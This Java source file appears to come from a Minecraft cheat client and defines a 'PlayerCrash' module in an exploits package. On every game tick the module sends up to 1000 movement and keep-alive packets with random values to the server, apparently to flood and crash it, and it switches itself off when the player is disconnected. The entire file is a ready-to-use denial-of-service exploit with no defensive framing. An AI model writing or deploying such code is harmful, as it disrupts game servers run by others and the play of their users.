package me.pm.lemon.module.modules.exploits;

import me.pm.lemon.event.EventTarget;
import me.pm.lemon.event.events.ReadPacketEvent;
import me.pm.lemon.event.events.TickEvent;
import me.pm.lemon.gui.clickGui.settings.*;
import me.pm.lemon.module.Category;
import me.pm.lemon.module.Module;
import net.minecraft.network.packet.c2s.play.KeepAliveC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.network.packet.s2c.play.DisconnectS2CPacket;

import java.awt.*;

public class PlayerCrash extends Module {
    public PlayerCrash(String name, Category category, String description, int keyCode, Color color) {
        super(name, category, description, keyCode, color,
                new SettingSlider("Uses", 1, 1000, 100, 0),
                new SettingToggle("Auto-Off", true));
    }

    @EventTarget
    public void onTick(TickEvent event) {
        for (int i = 0; i < getSetting(0).asSlider().getValue(); i++) {
            mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket(Math.random() >= 0.5));
            mc.player.networkHandler.sendPacket(new KeepAliveC2SPacket((int) (Math.random() * 8)));
        }
    }

    @EventTarget
    private void EventDisconnect(ReadPacketEvent event) {
        if (event.getPacket() instanceof DisconnectS2CPacket && getSetting(1).asToggle().state) setToggled(false);
    }
}
